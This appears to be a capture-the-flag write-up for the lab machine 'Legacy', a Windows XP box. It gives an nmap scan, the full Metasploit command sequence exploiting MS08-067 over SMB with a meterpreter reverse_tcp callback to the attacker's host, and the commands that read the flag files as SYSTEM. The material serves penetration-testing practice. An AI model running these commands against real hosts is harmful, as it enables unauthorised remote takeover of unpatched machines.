Legacy is an easy Windows box with simple solution steps. It is just an ancient Windows XP host with SMB exposed and a critical unpatched vulnerability in it. I fingerprint the OS, confirm it's missing the MS08-067 patch and fire the matching Metasploit module. The exploit lands me straight as `NT AUTHORITY\SYSTEM` so both flags are acquired at the same time.

## Recon

### nmap

I start with a scan that shows open ports:

```
chickenprophecy@pwn$ nmap -vvv -sV -sC --open -oA legacy 10.129.227.181

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
```

![nmap output]({{ '/assets/img/legacy/02-nmap-1.png' | relative_url }})
![nmap output]({{ '/assets/img/legacy/03-nmap-2.png' | relative_url }})


Three ports, all of them SMB/RPC, and nothing else. The `smb-os-discovery` script confirms the host is **Windows XP** . 


## Exploitation → SYSTEM

![nmap output]({{ '/assets/img/legacy/04-nmap-3.png' | relative_url }})
MS08-067 is a bug in the Windows Server service (`netapi32.dll`) that lets an unauthenticated attacker trigger remote code execution over SMB. Metasploit has a module for it.

```
chickenprophecy@pwn$ msfconsole
```

I load the module, point it at the box, and set a standard `meterpreter/reverse_tcp` payload back to my machine.

```
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 exploit(ms08_067_netapi) > set RHOSTS 10.129.227.181
msf6 exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(ms08_067_netapi) > set LHOST 10.10.15.179
msf6 exploit(ms08_067_netapi) > set LPORT 4444
msf6 exploit(ms08_067_netapi) > set TARGET 7
msf6 exploit(ms08_067_netapi) > exploit
```

The exploit fires and a Meterpreter session opens.

```
(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\SYSTEM

(Meterpreter 1)(C:\WINDOWS\system32) > pwd
C:\WINDOWS\system32
```

We have entered as `NT AUTHORITY\SYSTEM` 

## Flags


```
(Meterpreter 1)(C:\WINDOWS\system32) > shell
C:\WINDOWS\system32> dir /s /b C:\*.txt
```
 The user flag sits on `john`'s desktop and the root flag on the Administrator's:

```
C:\WINDOWS\system32> type "C:\Documents and Settings\john\Desktop\user.txt"
[user flag]

C:\WINDOWS\system32> type "C:\Documents and Settings\Administrator\Desktop\root.txt"
[root flag]
```

Since I'm already SYSTEM, both are readable in the same session.

Got both flags :)
